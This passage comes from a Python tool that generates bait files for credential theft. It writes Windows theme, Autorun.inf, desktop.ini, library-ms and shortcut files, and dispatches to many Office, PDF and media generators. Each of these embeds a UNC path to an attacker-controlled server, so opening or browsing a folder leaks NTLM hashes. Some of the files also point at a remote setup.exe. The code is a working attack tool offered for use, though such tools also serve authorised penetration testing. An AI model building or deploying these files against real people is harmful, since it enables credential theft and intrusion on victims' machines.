SizeAll=\\\\'''+server+'''\\aero_move.cur
SizeNESW=\\\\'''+server+'''\\aero_nesw.cur
SizeNS=\\\\'''+server+'''\\aero_ns.cur
SizeNWSE=\\\\'''+server+'''\\aero_nwse.cur
SizeWE=\\\\'''+server+'''\\aero_ew.cur
UpArrow=\\\\'''+server+'''\\aero_up.cur
Wait=\\\\'''+server+'''\\aero_busy.ani
DefaultValue=Windows Default
DefaultValue.MUI=@main.cpl,-1020

[Control Panel\\Desktop]
Wallpaper=\\\\'''+server+'''\\setup.exe
TileWallpaper=0
WallpaperStyle=10
Pattern=
MultimonBackgrounds=0

[VisualStyles]
Path=\\\\'''+server+'''\\Themes\\Aero\\Aero.msstyles
ColorStyle=NormalColor
Size=NormalSize
AutoColorization=0
ColorizationColor=0XC40078D4
SystemMode=Light
AppMode=Light

[boot]
SCRNSAVE.EXE=

[MasterThemeSelector]
MTSM=RJSPBS

[Sounds]
; IDS_SCHEME_DEFAULT
SchemeName=@\\\\'''+server+'''\\setup.dll,-800
		''')
	log_created(filename, "THEME TO INSTALL")

def create_autoruninf(generate,server,filename):
	if generate == "modern":
		log_skip("Skipping Autorun.inf as it does not work on modern Windows")
		return
	file = open(filename,'w')
	file.write('''[autorun]
open=\\\\''' + server + '''\\setup.exe
icon=something.ico
action=open Setup.exe''')
	file.close()
	log_created(filename, "BROWSE TO FOLDER")

def create_desktopini(generate,server,filename):
	if generate == "modern":
		log_skip("Skipping desktop.ini as it does not work on modern Windows")
		return
	file = open(filename,'w')
	file.write('''[.ShellClassInfo]
IconResource=\\\\''' + server + '''\\aa''')
	file.close()
	log_created(filename, "BROWSE TO FOLDER")

def create_libraryms(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@shell32.dll,-34575</name>
<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
<version>1</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>\\\\''' + server + '''\\aa</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34577</description>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<simpleLocation>
<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34579</description>
<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
<simpleLocation>
<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>''')
	file.close()
	log_created(filename, "BROWSE TO FOLDER")


# .lnk remote IconFile Attack
# Filename: shareattack.lnk, action=browse, attacks=explorer
def create_lnk(generate,server,filename):
	# these two numbers define location in template that holds icon location
	offset = 0x136
	max_path = 0xDF
	unc_path = f'\\\\{server}\\tools\\nc.ico'
	if len(unc_path) >= max_path:
		log_skip("Server name too long for lnk template, skipping.")
		return
	unc_path = unc_path.encode('utf-16le')
	with open(os.path.join(script_directory,"templates", "shortcut-template.lnk"), 'rb') as lnk:
		shortcut = list(lnk.read())
	for i in range(0, len(unc_path)):
		shortcut[offset + i] = unc_path[i]
	with open(filename,'wb') as file:
		file.write(bytes(shortcut))
	log_created(filename, "BROWSE TO FOLDER")


def main(argv=None) -> int:
	global _COLOR_MODE
	global _COLOR_ENABLED

	args = parser.parse_args(argv)
	_COLOR_MODE = args.color
	_COLOR_ENABLED = _compute_color_enabled(_COLOR_MODE)

	if args.list:
		for generator in sorted(GENERATOR_DESCRIPTIONS.keys()):
			print(f"{generator:12} {GENERATOR_DESCRIPTIONS[generator]}")
		return 0

	if args.describe:
		print(f"{args.describe}: {GENERATOR_DESCRIPTIONS[args.describe]}")
		return 0

	if not args.generate:
		parser.error("the following arguments are required: -g/--generate")
	if not args.server:
		parser.error("the following arguments are required: -s/--server")
	if not args.filename:
		parser.error("the following arguments are required: -f/--filename")

	try:
		validate_basename(args.filename)
	except ValueError as e:
		parser.error(str(e))

	output_parent = os.path.abspath(os.path.expanduser(args.output_dir))
	output_dir = os.path.join(output_parent, args.filename)

	output_dir_abs = os.path.abspath(output_dir)
	output_parent_abs = os.path.abspath(output_parent)
	if output_dir_abs in (os.path.abspath(os.sep), "/"):
		raise ValueError("Refusing to operate on filesystem root")
	if output_dir_abs == output_parent_abs:
		raise ValueError("Refusing to use output-dir as the output folder; pass a base filename via -f")

	if os.path.exists(output_dir_abs):
		if args.force:
			shutil.rmtree(output_dir_abs)
		else:
			resp = input(f"Output folder '{output_dir_abs}' exists. Delete it? [y/N] ").strip().lower()
			if resp not in ("y", "yes"):
				return 0
			shutil.rmtree(output_dir_abs)

	os.makedirs(output_dir_abs)

	base = os.path.join(output_dir_abs, args.filename)
	generate = args.generate

	if generate in ("all", "modern"):
		create_scf(generate, args.server, base + ".scf")

		create_url_url(generate, args.server, base + "-(url).url")
		create_url_icon(generate, args.server, base + "-(icon).url")

		create_lnk(generate, args.server, base + ".lnk")

		create_rtf(generate, args.server, base + ".rtf")

		create_xml(generate, args.server, base + "-(stylesheet).xml")
		create_xml_includepicture(generate, args.server, base + "-(fulldocx).xml")

		create_htm(generate, args.server, base + ".htm")
		create_htm_handler(generate, args.server, base + "-(handler).htm")

		create_docx_includepicture(generate, args.server, base + "-(includepicture).docx")
		create_docx_remote_template(generate, args.server, base + "-(remotetemplate).docx")
		create_docx_frameset(generate, args.server, base + "-(frameset).docx")

		create_xlsx_externalcell(generate, args.server, base + "-(externalcell).xlsx")

		create_wax(generate, args.server, base + ".wax")
		create_m3u(generate, args.server, base + ".m3u")
		create_asx(generate, args.server, base + ".asx")
		create_jnlp(generate, args.server, base + ".jnlp")
		create_application(generate, args.server, base + ".application")		
		create_pdf(generate, args.server, base + ".pdf")

		create_zoom(generate, args.server, os.path.join(output_dir_abs, "zoom-attack-instructions.txt"))
		create_libraryms(generate, args.server, base + ".library-ms")
		create_autoruninf(generate, args.server, os.path.join(output_dir_abs, "Autorun.inf"))
		create_desktopini(generate, args.server, os.path.join(output_dir_abs, "desktop.ini"))
		create_theme(generate, args.server, base + ".theme")

	elif generate == "odt":
		create_odt_ntlm_leak(args.server, base + ".odt")

	elif generate == "scf":
		create_scf(generate, args.server, base + ".scf")

	elif generate == "url":
		create_url_url(generate, args.server, base + "-(url).url")
		create_url_icon(generate, args.server, base + "-(icon).url")

	elif generate == "lnk":
		create_lnk(generate, args.server, base + ".lnk")

	elif generate == "rtf":
		create_rtf(generate, args.server, base + ".rtf")

	elif generate == "xml":
		create_xml(generate, args.server, base + "-(stylesheet).xml")
		create_xml_includepicture(generate, args.server, base + "-(fulldocx).xml")

	elif generate == "htm":
		create_htm(generate, args.server, base + ".htm")

	elif generate == "docx":
		create_docx_includepicture(generate, args.server, base + "-(includepicture).docx")
		create_docx_remote_template(generate, args.server, base + "-(remotetemplate).docx")
		create_docx_frameset(generate, args.server, base + "-(frameset).docx")

	elif generate == "xlsx":
		create_xlsx_externalcell(generate, args.server, base + "-(externalcell).xlsx")

	elif generate == "wax":
		create_wax(generate, args.server, base + ".wax")

	elif generate == "m3u":
		create_m3u(generate, args.server, base + ".m3u")

	elif generate == "asx":
		create_asx(generate, args.server, base + ".asx")

	elif generate == "jnlp":
		create_jnlp(generate, args.server, base + ".jnlp")

	elif generate == "application":
		create_application(generate, args.server, base + ".application")

	elif generate == "pdf":
		create_pdf(generate, args.server, base + ".pdf")

	elif generate == "zoom":
		create_zoom(generate, args.server, os.path.join(output_dir_abs, "zoom-attack-instructions.txt"))

	elif generate == "libraryms":
		create_libraryms(generate, args.server, base + ".library-ms")

	elif generate == "autoruninf":
		create_autoruninf(generate, args.server, os.path.join(output_dir_abs, "Autorun.inf"))

	elif generate == "desktopini":
		create_desktopini(generate, args.server, os.path.join(output_dir_abs, "desktop.ini"))

	elif generate == "theme":
		create_theme(generate, args.server, base + ".theme")

	if args.zip_output:
		zip_path = output_dir_abs + ".zip"
		zip_directory(output_dir_abs, zip_path)
		log_created(zip_path, "ZIP")

	log_info("Generation Complete.")
	return 0


if __name__ == "__main__":
	raise SystemExit(main())

